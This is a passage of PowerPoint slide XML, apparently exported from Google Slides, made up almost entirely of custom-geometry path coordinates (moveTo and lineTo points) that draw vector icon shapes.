                    <a:pt x="6200" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="10272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="10382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="10382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="10272"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="5210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="1"/>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20" name="Google Shape;320;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6062250" y="3853825"/>
              <a:ext cx="332900" cy="376025"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="13316" h="15041" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5466" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5466" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="1285"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="1652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="2459"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="2569"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="2679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2459"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8840" y="3816"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8730" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="4293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8253" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="3963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="3816"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="147" y="2972"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="73" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="4990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="4183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="2972"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8400" y="2679"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10124" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="5210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="2679"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2494" y="7227"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2421" y="7301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="7411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="8108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="8108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="7411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="7411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="7227"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3191" y="6090"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3595" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="9025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="9025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="6714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3081" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="6090"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12729" y="11005"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12655" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="11005"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9647" y="12949"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9721" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="13280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="13280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="13133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="12949"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6640" y="12839"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6493" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="12839"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7336" y="13170"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7263" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="13243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="13720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="13977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="14307"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="14490"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="14527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="14527"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="14453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="13830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="13280"/>
                  </a:lnTo>
